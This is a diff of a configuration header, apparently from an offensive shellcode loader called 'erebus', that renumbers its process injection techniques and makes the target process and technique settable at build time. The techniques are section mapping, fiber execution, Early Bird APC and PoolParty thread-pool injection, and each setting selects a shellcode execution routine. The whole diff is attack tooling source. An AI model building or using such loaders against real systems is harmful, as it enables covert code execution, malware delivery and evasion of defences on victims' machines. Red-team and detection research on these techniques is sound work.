@@ -53,31 +53,32 @@
 // ============================================
 
 // Target process for remote injection
+#ifndef CONFIG_TARGET_PROCESS
 #define CONFIG_TARGET_PROCESS L"{{ TARGET_PROCESS }}"
+#endif
 
 // Injection technique:
-// 1 = NtQueueApcThread    - APC injection to suspended thread (Remote)
-// 2 = NtMapViewOfSection  - Section mapping injection (Remote)
-// 3 = CreateFiber         - Fiber-based execution (Self)
-// 4 = EarlyCascade        - Early Bird APC injection (Remote)
-// 5 = PoolParty           - Worker Factory thread pool injection (Remote)
+// 1 = NtMapViewOfSection  - Section mapping injection (Remote)
+// 2 = CreateFiber         - Fiber-based execution (Self)
+// 3 = EarlyCascade        - Early Bird APC injection via NtQueueApcThread (Remote)
+// 4 = PoolParty           - Worker Factory thread pool injection (Remote)
+#ifndef CONFIG_INJECTION_TYPE
 #define CONFIG_INJECTION_TYPE {{ INJECTION_TYPE }}
+#endif
 
-#if CONFIG_INJECTION_TYPE == 3
+#if CONFIG_INJECTION_TYPE == 2
 #define CONFIG_INJECTION_MODE 2  // Self injection
 #else
 #define CONFIG_INJECTION_MODE 1  // Remote injection
 #endif
 
 #if CONFIG_INJECTION_TYPE == 1
-#define ExecuteShellcode erebus::InjectionNtQueueApcThread
-#elif CONFIG_INJECTION_TYPE == 2
 #define ExecuteShellcode erebus::InjectionNtMapViewOfSection
-#elif CONFIG_INJECTION_TYPE == 3
+#elif CONFIG_INJECTION_TYPE == 2
 #define ExecuteShellcode erebus::InjectionCreateFiber
-#elif CONFIG_INJECTION_TYPE == 4
+#elif CONFIG_INJECTION_TYPE == 3
 #define ExecuteShellcode erebus::InjectionEarlyCascade
-#elif CONFIG_INJECTION_TYPE == 5
+#elif CONFIG_INJECTION_TYPE == 4
 #define ExecuteShellcode erebus::InjectionPoolParty
 #endif
 
